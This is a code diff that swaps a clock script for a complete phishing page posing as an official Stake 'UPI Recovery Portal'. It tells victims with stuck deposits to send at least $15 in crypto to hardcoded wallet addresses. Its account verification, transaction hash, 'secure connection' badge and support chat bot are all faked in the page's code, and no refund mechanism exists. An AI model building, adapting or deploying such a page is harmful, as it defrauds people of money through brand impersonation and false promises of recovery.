@@ -1,7 +1,787 @@
-function showTime() {
-	document.getElementById('currentTime').innerHTML = new Date().toUTCString();
-}
-showTime();
-setInterval(function () {
-	showTime();
-}, 1000);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Stake UPI Recovery Portal</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/qrious@4.0.2/dist/qrious.min.js"></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
+    }
+    body {
+      background: linear-gradient(145deg, #1a1a1a, #2c2c2c);
+      color: #f5f5f5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px;
+    }
+    .container {
+      width: 100%;
+      max-width: 600px;
+      padding: 20px;
+    }
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: #252525;
+      padding: 15px 20px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      box-shadow: 0 2px 8px rgba(0, 255, 157, 0.1);
+    }
+    .header img {
+      width: 100px;
+    }
+    .header h2 {
+      font-size: 1.6rem;
+      color: #00ff9d;
+      font-weight: 600;
+    }
+    .info-box {
+      background: #252525;
+      padding: 15px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      font-size: 0.95rem;
+      line-height: 1.5;
+      border-left: 4px solid #00ff9d;
+    }
+    .card {
+      background: #2e2e2e;
+      padding: 20px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    label {
+      font-weight: 600;
+      font-size: 1rem;
+      color: #00ff9d;
+      margin-bottom: 6px;
+      display: block;
+    }
+    input, select {
+      width: 100%;
+      padding: 12px;
+      background: #3a3a3a;
+      border: 2px solid transparent;
+      border-radius: 8px;
+      color: #f5f5f5;
+      font-size: 1rem;
+      transition: border 0.3s, box-shadow 0.3s;
+    }
+    input:focus, select:focus {
+      border: 2px solid #00ff9d;
+      box-shadow: 0 0 8px rgba(0, 255, 157, 0.3);
+      outline: none;
+    }
+    .error {
+      border: 2px solid #ff4d4d;
+    }
+    .error-message {
+      color: #ff4d4d;
+      font-size: 0.85rem;
+      margin-top: 4px;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 8px;
+      background: #00ff9d;
+      color: #1a1a1a;
+      font-weight: 600;
+      font-size: 1.1rem;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+    button:hover {
+      transform: scale(1.02);
+      box-shadow: 0 4px 12px rgba(0, 255, 157, 0.4);
+    }
+    .copy-btn, .save-btn {
+      background: #4682b4;
+      color: #f5f5f5;
+      margin-top: 10px;
+    }
+    .message {
+      font-size: 0.9rem;
+      color: #00ff9d;
+      margin-top: 6px;
+    }
+    #qr-code-container {
+      text-align: center;
+      margin-top: 15px;
+    }
+    #qr {
+      margin: 10px auto;
+      border: 2px solid #00ff9d;
+      border-radius: 8px;
+    }
+    #popup, #processing {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #252525;
+      color: #f5f5f5;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
+      z-index: 9999;
+      max-width: 90%;
+      text-align: center;
+      animation: fadeIn 0.3s;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    .blur {
+      filter: blur(4px);
+      pointer-events: none;
+    }
+    #chat-box {
+      display: none;
+      position: fixed;
+      top: 0;
+      right: 0;
+      width: 350px;
+      height: 100%;
+      background: #2e2e2e;
+      color: #f5f5f5;
+      padding: 20px;
+      z-index: 1000;
+      box-shadow: -4px 0 12px rgba(0, 0, 0, 0.3);
+      overflow-y: auto;
+      transition: transform 0.3s;
+      transform: translateX(100%);
+    }
+    #chat-box.active {
+      transform: translateX(0);
+    }
+    .chat-icon {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: #00ff9d;
+      color: #1a1a1a;
+      padding: 12px;
+      border-radius: 50%;
+      cursor: pointer;
+      z-index: 999;
+      box-shadow: 0 2px 8px rgba(0, 255, 157, 0.3);
+    }
+    #chat-box p {
+      margin-bottom: 10px;
+      font-size: 0.95rem;
+    }
+    #chat-box .user-message {
+      text-align: right;
+      color: #00ff9d;
+    }
+    #chat-box .bot-message {
+      text-align: left;
+      color: #4682b4;
+    }
+    #chat-box .timestamp {
+      font-size: 0.7rem;
+      color: #aaa;
+    }
+    #chat-input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border-radius: 6px;
+      border: none;
+      background: #3a3a3a;
+      color: #f5f5f5;
+    }
+    #chat-send {
+      margin-top: 8px;
+      background: #00ff9d;
+      color: #1a1a1a;
+    }
+    #progress-bar {
+      width: 100%;
+      height: 5px;
+      background: #3a3a3a;
+      border-radius: 5px;
+      overflow: hidden;
+      margin-top: 10px;
+    }
+    #progress {
+      width: 0;
+      height: 100%;
+      background: #00ff9d;
+      transition: width 3s linear;
+    }
+    #transaction-history {
+      margin-top: 20px;
+      background: #2e2e2e;
+      padding: 20px;
+      border-radius: 12px;
+      display: none;
+    }
+    #transaction-history h3 {
+      font-size: 1.3rem;
+      color: #00ff9d;
+      margin-bottom: 15px;
+    }
+    #transaction-list {
+      list-style: none;
+    }
+    #transaction-list li {
+      padding: 10px;
+      background: #3a3a3a;
+      border-radius: 8px;
+      margin-bottom: 8px;
+      font-size: 0.9rem;
+    }
+    .custom-select {
+      position: relative;
+      width: 100%;
+    }
+    .selected-coin {
+      padding: 12px;
+      background: #3a3a3a;
+      border: 2px solid transparent;
+      border-radius: 8px;
+      color: #f5f5f5;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      min-height: 44px;
+      transition: border 0.3s;
+    }
+    .selected-coin:hover, .selected-coin:focus {
+      border: 2px solid #00ff9d;
+    }
+    .selected-coin img {
+      width: 20px;
+      height: 20px;
+      margin-right: 10px;
+      border-radius: 50%;
+      border: 2px solid #00ff9d;
+    }
+    .coin-options {
+      display: none;
+      position: absolute;
+      top: 100%;
+      left: 0;
+      width: 100%;
+      background: #3a3a3a;
+      border: 2px solid #00ff9d;
+      border-radius: 8px;
+      list-style: none;
+      z-index: 100;
+      max-height: 240px;
+      overflow-y: auto;
+    }
+    .coin-options li {
+      padding: 12px;
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+      color: #f5f5f5;
+    }
+    .coin-options li img {
+      width: 20px;
+      height: 20px;
+      margin-right: 10px;
+      border-radius: 50%;
+    }
+    .coin-options li:hover {
+      background: #00ff9d;
+      color: #1a1a1a;
+    }
+    .ssl-badge {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 0.9rem;
+      color: #00ff9d;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+    @media (max-width: 600px) {
+      .container {
+        padding: 15px;
+        max-width: 95%;
+      }
+      .header {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+      .header h2 {
+        font-size: 1.4rem;
+        margin-top: 10px;
+      }
+      .selected-coin, .coin-options li {
+        font-size: 0.95rem;
+      }
+      #chat-box {
+        width: 100%;
+        right: 0;
+      }
+      button {
+        font-size: 1rem;
+        padding: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div id="main-content" class="container">
+    <div class="header">
+      <img src="stake-logo-white.png" alt="Stake Logo" />
+      <h2>Stake UPI Recovery Portal</h2>
+    </div>
+
+    <div class="info-box">
+      If your UPI/INR deposit is stuck, submit the details below along with a small crypto deposit (minimum $15 USD). Both your UPI and crypto amounts will be credited to your Stake account within 24-72 hours.
+    </div>
+
+    <div class="card">
+      <h3 style="color: #00ff9d; margin-bottom: 15px;">UPI Deposit Details</h3>
+      <div class="form-group">
+        <label for="username">Stake Username</label>
+        <input type="text" id="username" placeholder="Enter Stake Username" oninput="checkUsername()" />
+        <button id="verifyBtn" onclick="verifyUsername()" disabled>Verify</button>
+        <div class="message" id="verify-msg"></div>
+      </div>
+      <div class="form-group">
+        <label for="upi-amount">Stuck UPI/INR Amount (INR)</label>
+        <input type="number" id="upi-amount" step="0.01" placeholder="Enter stuck UPI amount" oninput="checkForm()" />
+        <div class="error-message" id="upi-amount-error"></div>
+      </div>
+      <div class="form-group">
+        <label for="utr-number">12-Digit UTR Number</label>
+        <input type="text" id="utr-number" placeholder="Enter 12-digit UTR number" oninput="checkForm()" />
+        <div class="error-message" id="utr-number-error"></div>
+      </div>
+      <div class="form-group">
+        <label for="stake-txn">Stake 10-Digit Transaction Number</label>
+        <input type="text" id="stake-txn" placeholder="Enter 10-digit Stake transaction number" oninput="checkForm()" />
+        <div class="error-message" id="stake-txn-error"></div>
+      </div>
+      <div class="form-group">
+        <label for="upi-screenshot">Upload UPI Payment Screenshot</label>
+        <input type="file" id="upi-screenshot" accept="image/*" onchange="previewUpiImage(event)" />
+        <div id="upi-img-preview"></div>
+      </div>
+    </div>
+
+    <div class="card">
+      <h3 style="color: #00ff9d; margin-bottom: 15px;">Crypto Deposit Details</h3>
+      <div class="form-group">
+        <label for="coin">Select Crypto Coin</label>
+        <div class="custom-select">
+          <div class="selected-coin">--Select Coin--</div>
+          <ul class="coin-options">
+            <li data-value="usdt" data-name="USDT"><img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" alt="USDT"> USDT</li>
+            <li data-value="btc" data-name="BTC"><img src="https://assets.coingecko.com/coins/images/1/large/bitcoin.png" alt="BTC"> BTC</li>
+            <li data-value="trx" data-name="TRX"><img src="https://assets.coingecko.com/coins/images/1094/large/tron-logo.png" alt="TRX"> TRX</li>
+            <li data-value="eth" data-name="Ethereum"><img src="https://assets.coingecko.com/coins/images/279/large/ethereum.png" alt="ETH"> Ethereum</li>
+            <li data-value="bnb" data-name="BNB"><img src="https://assets.coingecko.com/coins/images/825/large/bnb-icon2_2x.png" alt="BNB"> BNB</li>
+            <li data-value="sol" data-name="Solana"><img src="https://assets.coingecko.com/coins/images/4128/large/solana.png" alt="SOL"> Solana</li>
+            <li data-value="ada" data-name="Cardano"><img src="https://assets.coingecko.com/coins/images/975/large/cardano.png" alt="ADA"> Cardano</li>
+            <li data-value="doge" data-name="Dogecoin"><img src="https://assets.coingecko.com/coins/images/5/large/dogecoin.png" alt="DOGE"> Dogecoin</li>
+            <li data-value="shib" data-name="SHIBAINU"><img src="https://assets.coingecko.com/coins/images/11939/large/shiba.png" alt="SHIB"> SHIBAINU</li>
+          </ul>
+          <input type="hidden" id="coin" name="coin">
+        </div>
+      </div>
+      <div class="form-group">
+        <label for="network">Select Network</label>
+        <select id="network" onchange="updateAddress()">
+          <option value="">--Select Network--</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label for="address">Crypto Wallet Address</label>
+        <input type="text" id="address" readonly />
+        <button class="copy-btn" onclick="copyAddress()">Copy</button>
+        <div id="qr-code-container">
+          <canvas id="qr"></canvas>
+          <button class="save-btn" onclick="saveQR()">Save QR</button>
+        </div>
+      </div>
+      <div class="form-group">
+        <label for="crypto-amount">Crypto Deposit Amount (USD)</label>
+        <input type="number" id="crypto-amount" min="15" step="0.01" oninput="checkForm()" />
+        <div class="error-message" id="crypto-amount-error"></div>
+      </div>
+      <div class="form-group">
+        <label for="crypto-screenshot">Upload Crypto Transaction Screenshot</label>
+        <input type="file" id="crypto-screenshot" accept="image/*" onchange="previewCryptoImage(event)" />
+        <div id="crypto-img-preview"></div>
+      </div>
+    </div>
+
+    <button id="submitBtn" onclick="submitForm()" disabled>Submit Recovery Request</button>
+
+    <div id="transaction-history">
+      <h3>Transaction History</h3>
+      <ul id="transaction-list"></ul>
+    </div>
+
+    <div class="ssl-badge">🔒 Official Stake Recovery Portal | Secure Connection</div>
+  </div>
+
+  <div id="processing">
+    <p>Processing your recovery request...</p>
+    <div id="progress-bar"><div id="progress"></div></div>
+  </div>
+  <div id="popup">
+    <p>YOUR DEPOSIT RECOVERY REQUEST HAS BEEN RECEIVED. YOUR UPI AND CRYPTO AMOUNTS WILL BE CREDITED TO YOUR STAKE ACCOUNT WITHIN 24-72 HOURS.</p>
+    <button onclick="location.reload()">OK</button>
+  </div>
+
+  <div class="chat-icon" onclick="toggleChat()">💬</div>
+  <div id="chat-box">
+    <p class="bot-message"><strong>Stake Support:</strong> Hello! How can we assist you with your UPI deposit recovery? <span class="timestamp"></span></p>
+    <input type="text" id="chat-input" placeholder="Type your message..." />
+    <button id="chat-send" onclick="sendMessage()">Send</button>
+  </div>
+
+  <script>
+    const addressMap = {
+      usdt: { trc20: 'TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA', bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c', erc20: '0x4d31c46627c343939e7a02383c2451048a509a0c' },
+      btc: { bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c', erc20: '0x4d31c46627c343939e7a02383c2451048a509a0c', btc: '17ZCTUnesSTEfekkLjBo6dnfrpDFn8a7we' },
+      trx: { trc20: 'TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA', bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c', erc20: '0x4d31c46627c343939e7a02383c2451048a509a0c' },
+      eth: { bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c', erc20: '0x4d31c46627c343939e7a02383c2451048a509a0c' },
+      bnb: { bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c', erc20: '0x4d31c46627c343939e7a02383c2451048a509a0c' },
+      sol: { solana: '8xoyHAe9zgEUGzP2e139tJEEGN6qQfLQSZ6MvA9wJWpK', bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c' },
+      ada: { cardano: 'addr1vxtgv6awsqh6g3qujd32d89qyk24hcsjdl4jjkmh0m5xznchwfjrj', bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c' },
+      doge: { bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c', dogecoin: 'DG5m3gBtjpMy4zmK8R5nR7Ev4x8dWKVfk8' },
+      shib: { bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c', erc20: '0x4d31c46627c343939e7a02383c2451048a509a0c' }
+    };
+
+    const networkOptions = {
+      usdt: ['trc20', 'bsc', 'erc20'],
+      btc: ['bsc', 'erc20', 'btc'],
+      trx: ['trc20', 'bsc', 'erc20'],
+      eth: ['bsc', 'erc20'],
+      bnb: ['bsc', 'erc20'],
+      sol: ['solana', 'bsc'],
+      ada: ['cardano', 'bsc'],
+      doge: ['bsc', 'dogecoin'],
+      shib: ['bsc', 'erc20']
+    };
+
+    const qr = new QRious({ element: document.getElementById('qr'), size: 160 });
+    let transactionHistory = JSON.parse(localStorage.getItem('transactionHistory')) || [];
+
+    function updateNetworkOptions() {
+      const coin = document.getElementById('coin').value;
+      const networkSelect = document.getElementById('network');
+      networkSelect.innerHTML = '<option value="">--Select Network--</option>';
+      if (coin && networkOptions[coin]) {
+        networkOptions[coin].forEach(network => {
+          const option = document.createElement('option');
+          option.value = network;
+          option.textContent = network.toUpperCase();
+          networkSelect.appendChild(option);
+        });
+      }
+      updateAddress();
+      checkForm();
+    }
+
+    function checkUsername() {
+      const username = document.getElementById('username').value;
+      const verifyBtn = document.getElementById('verifyBtn');
+      const usernameRegex = /^[a-zA-Z0-9_]{3,20}$/;
+      if (!usernameRegex.test(username)) {
+        document.getElementById('verify-msg').innerText = 'Username: 3-20 characters, alphanumeric or underscore only.';
+        verifyBtn.disabled = true;
+      } else {
+        document.getElementById('verify-msg').innerText = '';
+        verifyBtn.disabled = !username.trim();
+      }
+      checkForm();
+    }
+
+    function updateAddress() {
+      const coin = document.getElementById('coin').value;
+      const network = document.getElementById('network').value;
+      const addressField = document.getElementById('address');
+      const helper = document.getElementById('verify-msg');
+      if (coin && network && addressMap[coin] && addressMap[coin][network]) {
+        const address = addressMap[coin][network];
+        addressField.value = address;
+        qr.value = address;
+        helper.innerText = `Deposit ${coin.toUpperCase()} on ${network.toUpperCase()} network.`;
+      } else {
+        addressField.value = '';
+        qr.value = '';
+        helper.innerText = '';
+      }
+      checkForm();
+    }
+
+    function verifyUsername() {
+      const msg = document.getElementById('verify-msg');
+      msg.innerText = 'Verifying...';
+      setTimeout(() => {
+        msg.innerText = 'Your Stake account is eligible for UPI deposit recovery. Please complete the form.';
+        navigator.vibrate?.(100);
+        document.getElementById('transaction-history').style.display = 'block';
+        updateTransactionHistory();
+      }, 1500);
+    }
+
+    function copyAddress() {
+      const address = document.getElementById('address');
+      address.select();
+      navigator.clipboard.writeText(address.value);
+      alert('Address copied!');
+    }
+
+    function saveQR() {
+      const qrCanvas = document.getElementById('qr');
+      const link = document.createElement('a');
+      link.href = qrCanvas.toDataURL();
+      link.download = 'qr-code.png';
+      link.click();
+    }
+
+    function previewUpiImage(event) {
+      const preview = document.getElementById('upi-img-preview');
+      preview.innerHTML = '';
+      const file = event.target.files[0];
+      if (file && file.type.startsWith('image/')) {
+        const img = document.createElement('img');
+        img.src = URL.createObjectURL(file);
+        img.style.maxWidth = '100%';
+        img.style.borderRadius = '8px';
+        preview.appendChild(img);
+      } else {
+        preview.innerText = 'Please upload a valid image file.';
+      }
+      checkForm();
+    }
+
+    function previewCryptoImage(event) {
+      const preview = document.getElementById('crypto-img-preview');
+      preview.innerHTML = '';
+      const file = event.target.files[0];
+      if (file && file.type.startsWith('image/')) {
+        const img = document.createElement('img');
+        img.src = URL.createObjectURL(file);
+        img.style.maxWidth = '100%';
+        img.style.borderRadius = '8px';
+        preview.appendChild(img);
+        const hash = document.createElement('p');
+        hash.innerText = 'Crypto Txn Hash: 0x' + Math.random().toString(36).substring(2, 15);
+        hash.style.color = '#00ff9d';
+        preview.appendChild(hash);
+      } else {
+        preview.innerText = 'Please upload a valid image file.';
+      }
+      checkForm();
+    }
+
+    function checkForm() {
+      const username = document.getElementById('username').value;
+      const upiAmount = parseFloat(document.getElementById('upi-amount').value) || 0;
+      const utrNumber = document.getElementById('utr-number').value;
+      const stakeTxn = document.getElementById('stake-txn').value;
+      const upiScreenshot = document.getElementById('upi-screenshot').files.length;
+      const coin = document.getElementById('coin').value;
+      const network = document.getElementById('network').value;
+      const address = document.getElementById('address').value;
+      const cryptoAmount = parseFloat(document.getElementById('crypto-amount').value) || 0;
+      const cryptoScreenshot = document.getElementById('crypto-screenshot').files.length;
+      const submitBtn = document.getElementById('submitBtn');
+      const upiAmountInput = document.getElementById('upi-amount');
+      const utrInput = document.getElementById('utr-number');
+      const stakeTxnInput = document.getElementById('stake-txn');
+      const cryptoAmountInput = document.getElementById('crypto-amount');
+      const upiAmountError = document.getElementById('upi-amount-error');
+      const utrError = document.getElementById('utr-number-error');
+      const stakeTxnError = document.getElementById('stake-txn-error');
+      const cryptoAmountError = document.getElementById('crypto-amount-error');
+
+      if (upiAmount <= 0) {
+        upiAmountInput.classList.add('error');
+        upiAmountError.innerText = 'Please enter a valid UPI amount';
+        submitBtn.disabled = true;
+      } else {
+        upiAmountInput.classList.remove('error');
+        upiAmountError.innerText = '';
+      }
+
+      const utrRegex = /^\d{12}$/;
+      if (!utrRegex.test(utrNumber)) {
+        utrInput.classList.add('error');
+        utrError.innerText = 'UTR number must be exactly 12 digits';
+        submitBtn.disabled = true;
+      } else {
+        utrInput.classList.remove('error');
+        utrError.innerText = '';
+      }
+
+      const stakeTxnRegex = /^\d{10}$/;
+      if (!stakeTxnRegex.test(stakeTxn)) {
+        stakeTxnInput.classList.add('error');
+        stakeTxnError.innerText = 'Stake transaction number must be exactly 10 digits';
+        submitBtn.disabled = true;
+      } else {
+        stakeTxnInput.classList.remove('error');
+        stakeTxnError.innerText = '';
+      }
+
+      if (cryptoAmount < 15) {
+        cryptoAmountInput.classList.add('error');
+        cryptoAmountError.innerText = 'Crypto deposit must be at least $15';
+        submitBtn.disabled = true;
+      } else {
+        cryptoAmountInput.classList.remove('error');
+        cryptoAmountError.innerText = '';
+      }
+
+      submitBtn.disabled = !(username && upiAmount > 0 && utrRegex.test(utrNumber) && stakeTxnRegex.test(stakeTxn) && upiScreenshot && coin && network && address && cryptoAmount >= 15 && cryptoScreenshot);
+    }
+
+    function submitForm() {
+      const processing = document.getElementById('processing');
+      const progress = document.getElementById('progress');
+      processing.style.display = 'block';
+      document.getElementById('main-content').classList.add('blur');
+      progress.style.width = '100%';
+
+      const transaction = {
+        username: document.getElementById('username').value,
+        upiAmount: document.getElementById('upi-amount').value,
+        utrNumber: document.getElementById('utr-number').value,
+        stakeTxn: document.getElementById('stake-txn').value,
+        coin: document.getElementById('coin').value,
+        network: document.getElementById('network').value,
+        cryptoAmount: document.getElementById('crypto-amount').value,
+        timestamp: new Date().toLocaleString()
+      };
+      transactionHistory.push(transaction);
+      localStorage.setItem('transactionHistory', JSON.stringify(transactionHistory));
+      updateTransactionHistory();
+
+      setTimeout(() => {
+        processing.style.display = 'none';
+        document.getElementById('popup').style.display = 'block';
+        progress.style.width = '0';
+      }, 3000);
+    }
+
+    function updateTransactionHistory() {
+      const transactionList = document.getElementById('transaction-list');
+      transactionList.innerHTML = '';
+      transactionHistory.forEach(tx => {
+        const li = document.createElement('li');
+        li.innerText = `${tx.username}: ₹${tx.upiAmount} (UPI, UTR: ${tx.utrNumber}, Stake Txn: ${tx.stakeTxn}) + $${tx.cryptoAmount} (${tx.coin.toUpperCase()}) on ${tx.timestamp}`;
+        transactionList.appendChild(li);
+      });
+    }
+
+    function toggleChat() {
+      const chatBox = document.getElementById('chat-box');
+      chatBox.classList.toggle('active');
+      if (chatBox.classList.contains('active')) {
+        updateTimestamps();
+        chatBox.scrollTop = chatBox.scrollHeight;
+      }
+    }
+
+    function updateTimestamps() {
+      const timestamps = document.querySelectorAll('.timestamp');
+      const now = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
+      timestamps.forEach(ts => ts.textContent = now);
+    }
+
+    function sendMessage() {
+      const input = document.getElementById('chat-input');
+      const message = input.value.trim();
+      const chatBox = document.getElementById('chat-box');
+      const now = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
+
+      if (message) {
+        const userMsg = document.createElement('p');
+        userMsg.className = 'user-message';
+        userMsg.innerHTML = `<strong>You:</strong> ${message} <span class="timestamp">${now}</span>`;
+        chatBox.appendChild(userMsg);
+
+        setTimeout(() => {
+          let botReply = 'Please complete the form with all required details to recover your deposit. Any specific questions?';
+          const msgLower = message.toLowerCase();
+          if (msgLower.includes('upi') || msgLower.includes('inr')) {
+            botReply = 'Enter your stuck UPI amount, 12-digit UTR number, and upload the UPI payment screenshot.';
+          } else if (msgLower.includes('utr')) {
+            botReply = 'Ensure your UTR number is exactly 12 digits. Check your UPI transaction details.';
+          } else if (msgLower.includes('stake') || msgLower.includes('transaction number')) {
+            botReply = 'Enter the 10-digit Stake transaction number from your UPI deposit.';
+          } else if (msgLower.includes('crypto') || msgLower.includes('deposit')) {
+            botReply = 'Select a coin and network, deposit at least $15, and upload the transaction screenshot.';
+          } else if (msgLower.includes('time') || msgLower.includes('how long')) {
+            botReply = 'Your UPI and crypto amounts will be credited within 24-72 hours.';
+          }
+          const botMsg = document.createElement('p');
+          botMsg.className = 'bot-message';
+          botMsg.innerHTML = `<strong>Stake Support:</strong> ${botReply} <span class="timestamp">${now}</span>`;
+          chatBox.appendChild(botMsg);
+          chatBox.scrollTop = chatBox.scrollHeight;
+        }, 1000);
+
+        input.value = '';
+        chatBox.scrollTop = chatBox.scrollHeight;
+      }
+    }
+
+    // Coin dropdown handling
+    const selectedCoin = document.querySelector('.selected-coin');
+    const coinOptions = document.querySelector('.coin-options');
+    const coinInput = document.getElementById('coin');
+
+    function toggleDropdown(e) {
+      e.stopPropagation();
+      coinOptions.style.display = coinOptions.style.display === 'block' ? 'none' : 'block';
+    }
+
+    function selectCoin(e) {
+      e.stopPropagation();
+      const option = e.currentTarget;
+      const imgSrc = option.querySelector('img').src;
+      const coinName = option.getAttribute('data-name');
+      const coinValue = option.getAttribute('data-value');
+      selectedCoin.innerHTML = `<img src="${imgSrc}" alt="${coinName}"> ${coinName}`;
+      coinInput.value = coinValue;
+      coinOptions.style.display = 'none';
+      updateNetworkOptions();
+    }
+
+    selectedCoin.addEventListener('click', toggleDropdown);
+
+    coinOptions.querySelectorAll('li').forEach(option => {
+      option.addEventListener('click', selectCoin);
+    });
+
+    document.addEventListener('click', () => {
+      coinOptions.style.display = 'none';
+    });
+
+    updateTransactionHistory();
+  </script>
+</body>
+</html>
